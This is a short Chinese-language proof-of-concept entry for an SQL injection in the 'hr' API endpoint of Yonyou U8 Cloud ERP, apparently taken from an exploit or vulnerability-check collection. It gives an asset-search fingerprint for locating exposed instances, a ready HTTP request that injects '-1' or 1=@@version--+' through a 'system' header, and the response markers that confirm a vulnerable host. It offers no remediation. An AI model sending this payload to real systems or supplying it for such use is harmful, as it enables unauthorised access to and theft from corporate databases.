﻿# 用友U8 cloud hr SQL注入漏洞

> 更新时间：2024-04-17

> 漏洞编号：

> 漏洞说明：U8 cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案，全面支持多组织业务协同、营销创新、智能财务、人力服务，构建产业链制造平台，融合用友云服务，实现企业互联网资源连接、共享、协同，赋能中国成长型企业高速发展、云化创新。其接口hr存在sql注入漏洞，可被攻击者获取数据数据库敏感信息。

> 漏洞特征：product="用友-U8-Cloud"

> 验证脚本：HTTP

```
GET /u8cloud/api/hr HTTP/1.1
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close
system: -1' or 1=@@version--+
```

> 响应代码特征：200

> 响应内容特征：U8C

> 上传文件定位：

> 验证文件来源：用友U8 cloud hr SQL注入漏洞.poc

